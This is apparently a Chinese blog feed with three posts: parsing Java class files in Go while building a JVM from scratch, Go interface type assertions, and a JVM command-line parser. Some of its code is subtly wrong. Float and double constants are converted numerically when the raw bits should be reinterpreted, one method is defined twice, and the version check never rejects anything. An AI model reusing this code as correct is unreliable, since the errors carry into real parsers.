id="字段和方法表"><a href="#字段和方法表" class="headerlink" title="字段和方法表"></a>字段和方法表</h2><p>Class文件存储格式中对方法的描述与对字段的描述采用了几乎完全一致的方式， 方法表的结构如同字段表一样， 依次包括访问标志（access_flags） 、 名称索引（name_index） 、 描述符索引（descriptor_index） 、 属性表集合（attributes） 几项。</p><pre><code>field_info &#123;    u2        access_flags;    u2        name_index;    u2        descriptor_count;    u2        attributes_count;    attribute_info        attributes[attributes_count]; &#125;</code></pre><p>下面是本文中解析的Java代码</p><pre><code class="java">public class go&#123;    public static final boolean FLAG = true;    public static final byte BYTE = 123;    public static final char X = &#39;X&#39;;    public static final short SHORT = 12345;    public static final int INT = 123456789;    public static final long LONG = 12345678901L;    public static final float PI = 3.14f;    public static final double E = 2.71828;    public static void main(String[] args) throws RuntimeException&#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;</code></pre><h1 id="解析class文件"><a href="#解析class文件" class="headerlink" title="解析class文件"></a>解析class文件</h1><h2 id="结构体的创建"><a href="#结构体的创建" class="headerlink" title="结构体的创建"></a>结构体的创建</h2><p>因为直接去读去class文件的字节码不方便，而且会增加重复操作从而增加代码量，并且增大阅读难度，所以先定义一个结构体，来存储字节码。创建classfile/class_reader.go</p><pre><code class="go">type ClassReader struct&#123;    data []byte&#125;</code></pre><p>再定义几个方法去读取u1、u2、u4等字节的函数</p><h3 id="readUint8"><a href="#readUint8" class="headerlink" title="readUint8"></a>readUint8</h3><p>构造readUint8来读取u1类型的参数</p><pre><code class="go">func (self *ClassReader) readUint8() uint8 &#123;    val := self.data[0]    self.data = self.data[1:]    return val&#125;</code></pre><h3 id="readUint16"><a href="#readUint16" class="headerlink" title="readUint16"></a>readUint16</h3><p>构造readUint16来读取u2类型的参数,go语言的标准库encoding/binary，正好定义了一个变量BigEndian，正好可以从[]byte中解码多字节数据。</p><pre><code class="go">func (self *ClassReader) readUint16() uint16 &#123;    val := binary.BigEndian.Uint16(self.data)    self.data = self.data[2:]    return val&#125;</code></pre><h3 id="readUint32"><a href="#readUint32" class="headerlink" title="readUint32"></a>readUint32</h3><p>构造readUint函数来读取u4类型的参数</p><pre><code class="go">func (self *ClassReader) readUint32() uint32 &#123;    val := binary.BigEndian.Uint32(self.data)    self.data = self.data[4:]    return val&#125;</code></pre><h3 id="readUint64"><a href="#readUint64" class="headerlink" title="readUint64"></a>readUint64</h3><p>readUint64读取uint64类型数据，Java虚拟机规范中并没有定义u8.</p><pre><code class="go">func (self *ClassReader) readUint64() uint64 &#123;    val := binary.BigEndian.Uint64(self.data)    self.data = self.data[8:]    return val&#125;</code></pre><h3 id="readUint16s"><a href="#readUint16s" class="headerlink" title="readUint16s"></a>readUint16s</h3><p>定义readUint16s去读取uint16表，而表的大小是由开头的uint16的数据标明的。</p><pre><code class="go">func (self *ClassReader) readUint16s() []uint16 &#123;    n := self.readUint16()    s := make([]uint16, n)    for i := range s &#123;        s[i] = self.readUint16()    &#125;    return s&#125;</code></pre><h3 id="readBytes"><a href="#readBytes" class="headerlink" title="readBytes"></a>readBytes</h3><p>定义readBytes去读取一定数量的字节数据</p><pre><code class="go">func (self *ClassReader) readBytes(n uint32) []byte &#123;    bytes := self.data[:n]    self.data = self.data[n:]    return bytes&#125;</code></pre><h2 id="整体读取"><a href="#整体读取" class="headerlink" title="整体读取"></a>整体读取</h2><p>有了ClassReader就可以读取class文件了。下面这里再重新列一下class文件结构，虽然前面已经给出，但是这里再提一下方便阅读：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw0s473fc9j30v10u041j.jpg" alt=""></p><p>在classfile目录下创建class_file.go,首先按照class文件的格式创建一个结构体，但是结构体中去掉了字段数、方法数、属性个数的属性，来减少内存的占用，在读取时直接去读取字节。</p><pre><code class="go">type ClassFile struct &#123;    //magic uint32    minorVersion uint16    majorVersion uint16    constantPool ConstPool    accessFlags uint16    thisClass uint16    superClass uint16    interfaces []uint16    fields []*MemberInfo    methods []*MemberInfo    attributes []AttributeInfo&#125;</code></pre><p>class_file.go还实现了一系列的函数</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwdfmrclp3j30sg0vwdjw.jpg" alt=""></p><p>Parse函数将读取到的[]byte解析成ClassFile结构体，然后使用read函数存储金 ClassFile结构体中，read函数调用的是ClassRead，最后如果出错使用recover从错误场景中恢复，打印报错信息。</p><pre><code class="go">func Parse(classData []byte)(cf *ClassFile, err error)&#123;    defer func() &#123;        if r := recover(); r != nil &#123;            var ok bool            err, ok = r.(error)            if !ok &#123;                err = fmt.Errorf(&quot;%v&quot;, r)            &#125;        &#125;    &#125;()    cr := &amp;ClassReader&#123;classData&#125;    cf = &amp;ClassFile&#123;&#125;    cf.read(cr)    return&#125;func (self *ClassFile)read(cr *ClassReader)  &#123;    self.readAndCheckMagic(cr)    self.readAndCheckVersion(cr)    self.constantPool = readConstantPool(cr)    self.accessFlags = cr.readUint16()    self.thisClass = cr.readUint16()    self.superClass = cr.readUint16()    self.interfaces = cr.readUint16s()    self.fields = readMembers(cr, self.constantPool)    self.methods = readMembers(cr, self.constantPool)    self.attributes = readAttributes(cr, self.constantPool)&#125;</code></pre><pre><code>因为篇幅原因，下面给几个举例函数，其他几个函数的格式大抵相同：</code></pre><pre><code class="go">func (self *ClassFile)readAndCheckMagic(cr *ClassReader)&#123;       magic := cr.readUint32()       if magic != 0XCAFEBABE &#123;           panic(&quot;not java file&quot;)       &#125;&#125;func (self *ClassFile) SuperClassName() string &#123;      if self.superClass &gt; 0 &#123;           return self.constantPool.getClassName(self.superClass)       &#125;     return &quot;&quot;  &#125;    func (self *ClassFile) InterfaceNames() []string &#123;       interfaceNames := make([]string, len(self.interfaces))      for i, cpIndex := range self.interfaces &#123;               interfaceNames[i] = self.constantPool.getClassName(cpIndex)       &#125;     return interfaceNames  &#125;func (self *ClassFile)MinorVersion() uint16&#123;       return self.minorVersion  &#125;func (self *ClassFile) InterfaceNames() []string &#123;      interfaceNames := make([]string, len(self.interfaces))       for i, cpIndex := range self.interfaces &#123;           interfaceNames[i] = self.constantPool.getClassName(cpIndex)       &#125;     return interfaceNames  &#125;</code></pre><p>其中MajorVersion、MajorVersion、ConstantPool、AccessFlags、ClassName、Fields六个函数是gettet函数，用来返回字段值。SuperClassName用来返回超类名，InterfaceNames返回接口名。</p><p>在前面的文章中已经讲过class文件是如何表示Java版本的，这里的readAndCheckVersion用来检查版本</p><pre><code class="go">func (self *ClassFile)readAndCheckVersion(cr *ClassReader)&#123;   self.minorVersion = cr.readUint16()   self.majorVersion = cr.readUint16()   switch self.majorVersion &#123;   case 45:        return   case 46, 47, 48, 49, 50, 51, 52:        if self.minorVersion == 0&#123;   return   &#125;   &#125;&#125;</code></pre><h2 id="常量池-1"><a href="#常量池-1" class="headerlink" title="常量池"></a>常量池</h2><p>在class文件中版本号后面就是常量池了，常量池占据了很大一部分的数据，包括数字、字符串、类和接口名。</p><h3 id="ConstantInfo接口"><a href="#ConstantInfo接口" class="headerlink" title="ConstantInfo接口"></a>ConstantInfo接口</h3><p>ConstantInfo用来存储常量池中各种类型的数据，每个继承的结构体都需要实现readInfo()的函数来存储数据。创建一个classfile/const_pool.go，首先定义一些常量，来表示对应tag值的变量类型。</p><pre><code>CONSTANT_Class = 7  CONSTANT_Fieldref = 9  CONSTANT_Methodref = 10  CONSTANT_InterfaceMethodref = 11  CONSTANT_String = 8  CONSTANT_Integer = 3  CONSTANT_Float = 4  CONSTANT_Long = 5  CONSTANT_Double = 6  CONSTANT_NameAndType = 12  CONSTANT_Utf8 = 1  CONSTANT_MethodHandle = 15  CONSTANT_MethodType = 16  CONSTANT_InvokeDynamic = 18</code></pre><p>完整的代码如下，先读取tag通过tag的值初始化常量，然后去常量池中读取数据。</p><pre><code class="go">type ConstantInfo interface &#123;   readInfo(reader *ClassReader)  &#125;  func readConstantInfo(reader *ClassReader, cp ConstantPool) ConstantInfo&#123;   tag := reader.readUint8()   c := newConstantInfo(tag, cp)   c.readInfo(reader)   return c  &#125;  // todo ugly code  func newConstantInfo(tag uint8, cp ConstantPool) ConstantInfo &#123;   switch tag &#123;   case CONSTANT_Integer:        return &amp;ConstantIntegerInfo&#123;&#125;   case CONSTANT_Float:        return &amp;ConstantFloatInfo&#123;&#125;   case CONSTANT_Long:        return &amp;ConstantLongInfo&#123;&#125;   case CONSTANT_Double:        return &amp;ConstantDoubleInfo&#123;&#125;   case CONSTANT_Utf8:        return &amp;ConstantUtf8Info&#123;&#125;   case CONSTANT_String:        return &amp;ConstantStringInfo&#123;cp: cp&#125;   case CONSTANT_Class:        return &amp;ConstantClassInfo&#123;cp: cp&#125;   case CONSTANT_Fieldref:        return &amp;ConstantFieldrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_Methodref:        return &amp;ConstantMethodrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_InterfaceMethodref:        return &amp;ConstantInterfaceMethodrefInfo&#123;ConstantMemberrefInfo&#123;cp: cp&#125;&#125;   case CONSTANT_NameAndType:        return &amp;ConstantNameAndTypeInfo&#123;&#125;   case CONSTANT_MethodType:        return &amp;ConstantMethodTypeInfo&#123;&#125;   case CONSTANT_MethodHandle:        return &amp;ConstantMethodHandleInfo&#123;&#125;   case CONSTANT_InvokeDynamic:        return &amp;ConstantInvokeDynamicInfo&#123;&#125;   default:        panic(&quot;java.lang.ClassFormatError: constant pool tag!&quot;)   &#125;&#125;</code></pre><h3 id="ConstantPool"><a href="#ConstantPool" class="headerlink" title="ConstantPool"></a>ConstantPool</h3><p>在上面讲到获取常量，这里我们使用ConstantPool来存储常量池中所有的常量，因此ConstantPool是一个ConstantInfo的数组。</p><p>接下来是一些获取常量信息的函数如下：</p><pre><code class="go">func (self ConstantPool) getConstantInfo(index uint16) ConstantInfo &#123;   if cpInfo := self[index]; cpInfo != nil &#123;   return cpInfo     &#125;   panic(fmt.Errorf(&quot;Invalid constant pool index: %v!&quot;, index))  &#125;  func (self ConstantPool) getUtf8(index uint16) string&#123;   utf8Info := self.getConstantInfo(index).(*ConstantUtf8Info)   return utf8Info.str  &#125;  func (self ConstantPool)getNameAndType(index uint16)(string, string)&#123;   ntInfo := self.getConstantInfo(index).(*ConstantNameAndTypeInfo)   name := self.getUtf8(ntInfo.nameIndex)   des := self.getUtf8(ntInfo.descriptorIndex)   return name, des  &#125;  func (self ConstantPool)getClassName(index uint16) string&#123;   classinfo := self.getConstantInfo(index).(*ConstantClassInfo)   return self.getUtf8(classinfo.nameIndex)  &#125;    </code></pre><p>上面的这些函数都比较简单就不一一说明了，值得一提的是</p><blockquote><p>self.getConstantInfo(index).(*ConstantUtf8Info) </p></blockquote><p>如上的语句上将获取到的结构题转换为ConstantUtf8Info的结构体。</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="CONSTANT-Interger-info、CONSTANT-Float-info、CONSTANT-Long-info、ConstantDoubleInfo"><a href="#CONSTANT-Interger-info、CONSTANT-Float-info、CONSTANT-Long-info、ConstantDoubleInfo" class="headerlink" title="CONSTANT_Interger_info、CONSTANT_Float_info、CONSTANT_Long_info、ConstantDoubleInfo"></a>CONSTANT_Interger_info、CONSTANT_Float_info、CONSTANT_Long_info、ConstantDoubleInfo</h4><p>CONSTANT_Interger_info用4字节存储整数型常量，结构如下：</p><pre><code>        CONSTANT_Interger_info&#123;            u1 tag;            u4 bytes;    &#125;</code></pre><p>CONSTANT_Float_info使用4字节存储IEEE754单精度浮点数常量，结构如下：</p><pre><code>CONSTANT_Float_info&#123;        u1 tag;        u4 bytes;    &#125;    </code></pre><p>还要CONSTANT_Long_info使用8字节存储整数常量</p><pre><code>CONSTANT_Long_info&#123;        u1 tag;        u4 high_bytes;        u4 low_bytes;    &#125;</code></pre><p>可以看见这三个变量的结构都很相似，因此放在同一文件下，创建cp_numeric.go</p><pre><code class="go">type ConstantIntegerInfo struct &#123;   val int32  &#125;  func (self *ConstantIntegerInfo)readInfo(cr *ClassReader)  &#123;   bytes := cr.readUint32()   self.val =int32(bytes)  &#125;  func (self *ConstantIntegerInfo) Value() int32 &#123;   return self.val  &#125;type ConstantFloatInfo struct &#123;   val float32  &#125;  func (self *ConstantFloatInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint32()   self.val = float32(bytes)  &#125;  func (self *ConstantFloatInfo)Value()float32&#123;   return self.val  &#125;type ConstantLongInfo struct &#123;   val int64  &#125;  func (self *ConstantLongInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint64()   self.val = int64(bytes)  &#125;  func (self *ConstantLongInfo)Value() int64 &#123;   return self.val  &#125;type ConstantDoubleInfo struct &#123;   val float64  &#125;  func (self *ConstantDoubleInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint64()   self.val = float64(bytes)  &#125;  func (self *ConstantDoubleInfo)Value() float64&#123;   return self.val  &#125;</code></pre><h3 id="CONSTANT-Utf8-info"><a href="#CONSTANT-Utf8-info" class="headerlink" title="CONSTANT_Utf8_info"></a>CONSTANT_Utf8_info</h3><p>在class文件中并没有使用UTF-8编码而是使用了MUTF-8编码，</p><pre><code>MUTF-8（Modified UTF-8）编码，可以认为是对UTF-16编码的再编码。它的编码方式与UTF-8编码非常相似，只需要记住某些不同的情况，其他都与UTF-8编码一致。 具体的不同情况有二：        1. 对于Unicode的0码点，UTF-8直接使用1个字节去存储（0000 0000），而MUTF-8会使用2个字节去存储，最后存储的值为0xC080（1100 0000 1000 0000）。        2. 对于0x10000-0x10FFFF这块区域的Unicode码，之前提过UTF-8是使用4个字节去存储，而MUTF-8是对UTF-16的再编码，所以**MUTF-8是对UTF-16编码的两个字符分别用3个字节去编码（因为这段区域的Unicode码值转为UTF-16编码后前导代理和后导代理的范围是0xD800—0xDFFF，明显大于0x0800），共需要6个字节**。</code></pre><p>下面是解析mutf-8的函数：</p><pre><code class="go"> func decodeMUTF8(bytearr []byte) string &#123;   utflen := len(bytearr)   chararr := make([]uint16, utflen)   var c, char2, char3 uint16   count := 0   chararr_count := 0   for count &lt; utflen &#123;   c = uint16(bytearr[count])   if c &gt; 127 &#123;   break   &#125;   count++   chararr[chararr_count] = c        chararr_count++   &#125;   for count &lt; utflen &#123;   c = uint16(bytearr[count])   switch c &gt;&gt; 4 &#123;   case 0, 1, 2, 3, 4, 5, 6, 7:           /* 0xxxxxxx*/   count++   chararr[chararr_count] = c           chararr_count++   case 12, 13:           /* 110x xxxx   10xx xxxx*/   count += 2   if count &gt; utflen &#123;   panic(&quot;malformed input: partial character at end&quot;)   &#125; char2 = uint16(bytearr[count-1])   if char2&amp;0xC0 != 0x80 &#123;   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, count))   &#125; chararr[chararr_count] = c&amp;0x1F&lt;&lt;6 | char2&amp;0x3F   chararr_count++   case 14:           /* 1110 xxxx  10xx xxxx  10xx xxxx*/   count += 3   if count &gt; utflen &#123;   panic(&quot;malformed input: partial character at end&quot;)   &#125; char2 = uint16(bytearr[count-2])   char3 = uint16(bytearr[count-1])   if char2&amp;0xC0 != 0x80 || char3&amp;0xC0 != 0x80 &#123;   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, (count - 1)))   &#125; chararr[chararr_count] = c&amp;0x0F&lt;&lt;12 | char2&amp;0x3F&lt;&lt;6 | char3&amp;0x3F&lt;&lt;0   chararr_count++   default:           /* 10xx xxxx,  1111 xxxx */   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, count))   &#125; &#125; // The number of chars produced may be less than utflen   chararr = chararr[0:chararr_count]   runes := utf16.Decode(chararr)   return string(runes)  &#125;</code></pre><h3 id="CONSTANT-String-info"><a href="#CONSTANT-String-info" class="headerlink" title="CONSTANT_String_info"></a>CONSTANT_String_info</h3><p>该常量点结构如下：</p><pre><code>CONSTANT_String_info&#123;    u1 tag;    u2 string_index;&#125;    </code></pre><p>在如上结构中，可以看见有一个标识常量的tag值，然后一个常量池的索引,所以下面的代码直接通过索引获取到常量池中对应常量的值。</p><pre><code class="go">type ConstantStringInfo struct &#123;   cp ConstantPool   stringIndex uint16  &#125;  func (self *ConstantStringInfo) readInfo(reader *ClassReader)&#123;   self.stringIndex = reader.readUint16()  &#125;  func (self *ConstantStringInfo) String() string&#123;   return self.cp.getUtf8(self.stringIndex)  &#125;    </code></pre><p>同理CONSTANT_Class_info、CONSTANT_NameAndType_info也是如此</p><h3 id="CONSTANT-Fieldref-info、CONSTATNT-Methodref-info、CONSTANT-InterfaceMethodref-info"><a href="#CONSTANT-Fieldref-info、CONSTATNT-Methodref-info、CONSTANT-InterfaceMethodref-info" class="headerlink" title="CONSTANT_Fieldref_info、CONSTATNT_Methodref_info、CONSTANT_InterfaceMethodref_info"></a>CONSTANT_Fieldref_info、CONSTATNT_Methodref_info、CONSTANT_InterfaceMethodref_info</h3><p>fieldref表示字段符号引用，methodref表示普通方法符号引用，interfacemethodref表示接口方法符号引用，这三个常量结构一模一样。</p><pre><code class="go">type ConstantMemberrefInfo struct &#123;   cp                 ConstantPool   classIndex           uint16   nameAndTypeIndex   uint16  &#125;  func (self *ConstantMemberrefInfo) readInfo(reader *ClassReader)&#123;   self.classIndex = reader.readUint16()   self.nameAndTypeIndex = reader.readUint16()  &#125;  func (self *ConstantMemberrefInfo) ClassName() string &#123;   return self.cp.getClassName(self.classIndex)  &#125;  func (self *ConstantMemberrefInfo) NameAndDescriptor()(string, string)&#123;   return self.cp.getNameAndType(self.nameAndTypeIndex)  &#125;  type ConstantFieldrefInfo struct &#123;   ConstantMemberrefInfo  &#125;  type ConstantMethodrefInfo struct &#123;   ConstantMemberrefInfo  &#125;  type ConstantInterfaceMethodrefInfo struct &#123;   ConstantMemberrefInfo  &#125;</code></pre><p>和上面的方法差不多，还有其他的几个常量也是类似就不一一说了。</p><h2 id="字段和方法表-1"><a href="#字段和方法表-1" class="headerlink" title="字段和方法表"></a>字段和方法表</h2><p>字段表在存储字段和方法信息，这里如果忘记class文件的字节顺序的可以看前文。字段、方法表结构类似，差别仅在属性表，同时两表也有类访问标志，访问标志之后是一个常量池索引，给出字段名和方法名，然后又是一个常量池索引，指向字段和方法的描述符。在classfile目录下创建member_info.go代码</p><pre><code>field_info &#123;       u2             access_flags;     u2             name_index;    u2             descriptor_index;    u2             attributes_count;     attribute_info attributes[attributes_count];&#125;method_info &#123;       u2             access_flags;     u2             name_index;     u2             descriptor_index;    u2             attributes_count;     attribute_info attributes[attributes_count];&#125;</code></pre><pre><code class="go">type MemberInfo struct &#123;   cp              ConstantPool   accessFlags     uint16   nameIndex       uint16   descriptorIndex uint16   attributes      []AttributeInfo  &#125;  // read field or method table  func readMembers(reader *ClassReader, cp ConstantPool) []*MemberInfo &#123;   memberCount := reader.readUint16()   members := make([]*MemberInfo, memberCount)   for i := range members &#123;   members[i] = readMember(reader, cp)   &#125; return members  &#125;  func readMember(reader *ClassReader, cp ConstantPool) *MemberInfo &#123;   return &amp;MemberInfo&#123;   cp:              cp,        accessFlags:     reader.readUint16(),        nameIndex:       reader.readUint16(),        descriptorIndex: reader.readUint16(),        attributes:      readAttributes(reader, cp),     &#125;  &#125;</code></pre><h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gweiz505itj31bg0g0tau.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近的事情比较多，和去年比起来学习进度也比较慢，不过值得庆幸的是，这几个月也拿了两个省二和一个国三，希望在接下来时间中能够坚持学习。在学习大佬的代码中，也学习了很多go的方法和Java的基础知识。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《自己动手写Java虚拟机》</p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--class文件解析
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>接口断言：接口类型判断</title>
    <link href="http://yoursite.com/2021/11/01/%E6%8E%A5%E5%8F%A3%E6%96%AD%E8%A8%80%EF%BC%9A%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/"/>
    <id>http://yoursite.com/2021/11/01/%E6%8E%A5%E5%8F%A3%E6%96%AD%E8%A8%80%EF%BC%9A%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/</id>
    <published>2021-11-01T03:23:01.000Z</published>
    <updated>2021-11-14T03:24:39.588Z</updated>
    
    <content type="html"><![CDATA[<p>一个接口类型的变量varI通常含有很多种类型多变量，我们需要一种方式来获取到接口到动态类型。即在程序运行阶段，堆栈变量中存储的真实的变量类型。类型断言即可判断接口的动态类型.</p><pre><code>v := varI(T)</code></pre><p>在此之中varI必须为接口，否则编译器会报错。</p><p>在一段代码中我尝试直接用if和==的方式来确定接口当前的类型，但是编译器直接就爆红了，编写的代码如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635919350202-acb78c15-be0e-464a-9d9a-da384f6932bb.png" alt=""></p><p>报错回显是：<strong>use of .(type) outside of type switch</strong></p><p>有时候类型断言也是无效的，所以通常会采用另外一种安全的写法去书写类型断言</p><p>if v, ok := varI.(T); ok {<br>    Process(v)<br>    return<br>}</p><p>示例代码：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635920983989-efa92ba6-c970-4400-a5b5-c09f450f63cd.png" alt=""></p><p>同时也有另外一种方式来判断<strong>type-switch</strong>，示例代码如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635919466037-567d0f50-19b7-4205-bc3e-c6865db4b663.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      接口断言：接口类型判断
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>手撸一个JVM虚拟机--命令行工具</title>
    <link href="http://yoursite.com/2021/10/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2021/10/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/</id>
    <published>2021-10-14T08:23:01.000Z</published>
    <updated>2021-10-14T10:10:33.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="手撸一个JVM虚拟机–命令行工具"><a href="#手撸一个JVM虚拟机–命令行工具" class="headerlink" title="手撸一个JVM虚拟机–命令行工具"></a>手撸一个JVM虚拟机–命令行工具</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转眼就十月份了，最近都没有好好学习，暑假去安恒实习学到了很多，第一次自己尝试使用go和Java写工具，不过也感觉到了自己在一些基础知识上的薄弱，所以这里打算自己尝试使用go写一个Java虚拟机，希望能坚持写完。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Goland 2021.2</li><li>go version go1.16 darwin/arm64</li></ul><p>首先在%GOPATH%\src目录下创建一个gojvm目录，在目录下创建ch01目录，工作空间的目录结构如下：</p><pre><code>/Users/xiaotan/go/src  |-gojvm    |-ch01</code></pre><h2 id="Java-工作原理"><a href="#Java-工作原理" class="headerlink" title="Java 工作原理"></a>Java 工作原理</h2><p>JVM虚拟机的工作原理就是运行Java应用程序，而main函数则是Java应用程序的入口点，这个类可以用来启动Java应用程序，我们把这个类称为主类。而对于Java虚拟机并没有明确规定如何寻找类来启动应用程序，也就是说由Java虚拟机自行决定，例如Oracle的Java虚拟机实现是通过java命令来启动的，主类名由命令行参数指定。Java命令有如下四种形式：</p><pre><code>java [-options] class [args]java [-options] -jar jarfile [args]javaw [-options] class [args]javaw [-options] -jar jarfile [args]</code></pre><p>第一个非选项参数给出主类的完全限定名（fully qualified name）。但是如果用户提供了-jar选项，则第一个非选项参数表示JAR文件名，java命令必须从这个JAR文件中寻找主类。javaw命令和java命令几乎一样，唯一的差别在于，javaw命令不显示命令行窗口，因此特别适合于启动GUI应用程序。</p><table><thead><tr><th align="center">选项</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">–version</td><td align="center">输出版本信息然后退出</td></tr><tr><td align="center">-？/-help</td><td align="center">输出帮助信息，然后退出</td></tr><tr><td align="center">-cp/-classpath</td><td align="center">指定用户类路径</td></tr><tr><td align="center">-Dproperty=vlaue</td><td align="center">指定Java系统属性</td></tr><tr><td align="center">-Xms<size></td><td align="center">设置初始堆空间大小</td></tr><tr><td align="center">-Xmx<size></td><td align="center">设置最大堆空间大小</td></tr><tr><td align="center">-Xss<size></td><td align="center">设置线程栈空间大小</td></tr></tbody></table><h2 id="编写命令行工具"><a href="#编写命令行工具" class="headerlink" title="编写命令行工具"></a>编写命令行工具</h2><p>在ch01下创建一个cmd.go文件</p><pre><code class="go">package mainimport (    &quot;flag&quot;    &quot;fmt&quot;    &quot;os&quot;)type CMD struct &#123;    helpFlag bool    versionFlag bool    cpOption string    class string    args []string&#125;func parseCmd() *CMD&#123;    cmd := &amp;CMD&#123;&#125;    flag.Usage = printUsage    flag.BoolVar(&amp;cmd.helpFlag, &quot;help&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.helpFlag, &quot;?&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.versionFlag, &quot;version&quot;, false, &quot;print the version&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;classpath&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;cp&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.Parse()    args := flag.Args()    if len(args) &gt; 0&#123;        cmd.class = args[0]        cmd.args = args[1:]    &#125;    return cmd&#125;func printUsage()&#123;    fmt.Printf(&quot;Usage: %s [-options] class [args......]\n&quot;, os.Args[0])&#125;</code></pre><p>这里应用了go的内置包flag，通过不同的参数，调用不同的函数。这里先将printUsage()传给flag.Usage然后进行解析，如果解析失败则调用printUsage()函数。</p><p>再创建一个main.go</p><pre><code class="go">package mainimport &quot;fmt&quot;func main()&#123;    cmd := parseCmd()    if cmd.versionFlag&#123;        fmt.Println(&quot;1.0.0&quot;)    &#125;else if cmd.helpFlag || cmd.class == &quot;&quot;&#123;        printUsage()    &#125;else&#123;        startJVM(cmd)    &#125;&#125;func startJVM(cmd *CMD)&#123;    fmt.Printf(&quot;classpath: %s class %s args: %v\n&quot;, cmd.cpOption, cmd.class, cmd.args)&#125;</code></pre><h2 id="搜索class文件"><a href="#搜索class文件" class="headerlink" title="搜索class文件"></a>搜索class文件</h2><h3 id="加载类文件的流程"><a href="#加载类文件的流程" class="headerlink" title="加载类文件的流程"></a>加载类文件的流程</h3><p>下面是一个Java的hello world代码</p><pre><code class="java">public class HelloWorld&#123;    public static void main(String[] args)&#123;        System.out.println(&quot;Hello, world! &quot;);    &#125;&#125;</code></pre><p>加载HelloWorld类之前，首先要加载它的超类，也就是java.lang.Object。在调用main()方法之前，因此虚拟机需要准备好参数数组，所以需要加载java.lang.String和java.lang.String[]类。把字节符打印到控制台还需要加载java.lang.System类等等。</p><h3 id="类路径加载"><a href="#类路径加载" class="headerlink" title="类路径加载"></a>类路径加载</h3><p>   Java虚拟机规范并没有规定虚拟机应该从哪里寻找类，因此不同的虚拟机实现可以采用不同的方法。Oracle的Java虚拟机实现根据类路径（class path）来搜索类。会先后搜索启动类路径（bootstrap classpath），拓展类路径（extension classpath），用户类（user classpath）。启动类路径默认对应jre\lib目录，Java标准库（大部分在rt.jar里）位于该路径。拓展类路径默认对应jre\lib\ext目录，使用Java拓展机制的类位于这个路径。我们自己实现的类，以及第三方类库则位于用户类路径。可以通过- Xbootclasspath选项修改启动类路径，不过通常并不需要这样做，所以这里就不详细介绍。</p><p>用户类的默认值是当前目录及”.”。可以修改CLASSPATH环境变量来修改用户类路径，但是这样不够灵活，所以不推荐使用。更好的办法是给java命令传递-classpath。</p><h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><p>将ch01复制一份重命名为ch02，并在目录中创建classpath文件夹。<br>我们的Java虚拟机将使用JDK的启动类路径寻找和加载Java标准库中的类，所以需要中ch02/cmd.go中添加一个参数XjreOption来获得jre路径。</p><pre><code class="go">type CMD struct &#123;    helpFlag bool    versionFlag bool    cpOption string    XjreOption string    class string    args []string&#125;func parseCmd() *CMD&#123;    cmd := &amp;CMD&#123;&#125;    flag.Usage = printUsage    flag.BoolVar(&amp;cmd.helpFlag, &quot;help&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.helpFlag, &quot;?&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.versionFlag, &quot;version&quot;, false, &quot;print the version&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;classpath&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;cp&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.XjreOption, &quot;Xjre&quot;, &quot;&quot;, &quot;path to jre&quot;)    flag.Parse()    args := flag.Args()    if len(args) &gt; 